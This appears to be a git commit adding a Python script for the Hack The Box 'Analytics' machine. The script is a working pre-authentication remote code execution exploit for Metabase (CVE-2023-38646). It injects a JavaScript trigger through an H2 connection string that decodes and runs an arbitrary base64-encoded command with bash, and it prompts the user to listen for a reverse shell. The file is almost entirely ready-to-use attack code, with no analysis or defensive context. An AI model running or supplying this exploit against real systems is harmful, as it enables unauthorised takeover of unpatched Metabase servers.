e937bbd7867760908e090b93affc3ad57708efab
Fakechippies <cherryprofessorpraveen@gmail.com>
2024-10-12 22:04:04 +0530

    Analytics:HacktheBox

---
+++ HacktheBox/Analytics/main.py
@@ -0,0 +1,59 @@
+from argparse import ArgumentParser
+from string import ascii_uppercase
+
+import base64
+import random
+import requests
+
+
+def encode_command_to_b64(payload: str) -> str:
+    encoded_payload = base64.b64encode(payload.encode('ascii')).decode()
+    equals_count = encoded_payload.count('=')
+
+    if equals_count >= 1:
+        encoded_payload = base64.b64encode(f'{payload + " " * equals_count}'.encode('ascii')).decode()
+
+    return encoded_payload
+
+
+parser = ArgumentParser('Metabase Pre-Auth RCE Reverse Shell', 'This script causes a server running Metabase (< 0.46.6.1 for open-source edition and < 1.46.6.1 for enterprise edition) to execute a command through the security flaw described in CVE 2023-38646')
+
+parser.add_argument('-u', '--url', type=str, required=True, help='Target URL')
+parser.add_argument('-t', '--token', type=str, required=True, help='Setup Token from /api/session/properties')
+parser.add_argument('-c', '--command', type=str, required=True, help='Command to be execute in the target host')
+
+args = parser.parse_args()
+
+print('[!] BE SURE TO BE LISTENING ON THE PORT YOU DEFINED IF YOU ARE ISSUING AN COMMAND TO GET REVERSE SHELL [!]\n')
+
+print('[+] Initialized script')
+
+print('[+] Encoding command')
+
+command = encode_command_to_b64(args.command)
+
+url = f'{args.url}/api/setup/validate'
+
+headers = {
+    "Content-Type": "application/json",
+    "Connection": "close"
+}
+
+payload = {
+    "token": args.token,
+    "details": {
+        "details": {
+            "db": "zip:/app/metabase.jar!/sample-database.db;TRACE_LEVEL_SYSTEM_OUT=0\\;CREATE TRIGGER {random_string} BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{command}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x".format(random_string = ''.join(random.choice(ascii_uppercase) for i in range(12)), command=command),
+            "advanced-options": False,
+            "ssl": True
+        },
+        "name": "x",
+        "engine": "h2"
+    }
+}
+
+print('[+] Making request')
+
+request = requests.post(url, json=payload, headers=headers)
+
+print('[+] Payload sent')
